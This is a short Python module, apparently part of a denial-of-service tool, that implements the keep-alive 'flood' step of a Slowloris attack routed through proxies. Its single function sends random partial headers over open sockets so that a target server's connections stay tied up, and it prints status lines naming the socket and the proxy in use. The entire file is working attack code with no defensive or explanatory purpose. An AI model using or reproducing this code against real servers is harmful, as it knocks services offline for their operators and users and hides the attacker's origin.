"""This module provides the flood function for a Slowloris DoS attack through proxies."""

import random
import socket
from typing import Dict

from colorama import Fore as F


def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
    """Keep the sockets alive in Slowloris flood through proxies.

    Args:
        - sock - The socket to be kept alive
        - proxy - The proxy to be used

    Returns:
        None
    """
    laddr, port = sock.getsockname()
    random_header = random.randint(1, 5000)
    sock.send(f"X-a: {random_header}".encode("utf-8"))
    proxy_addr = (
        f"{F.RESET}|{F.RESET} Proxy: {F.BLUE}{proxy['addr'] + ':' + proxy['port']:>21} "
    )
    header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
    print(
        f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {proxy_addr}{F.RESET}|{header_sent} {F.RESET}"
    )
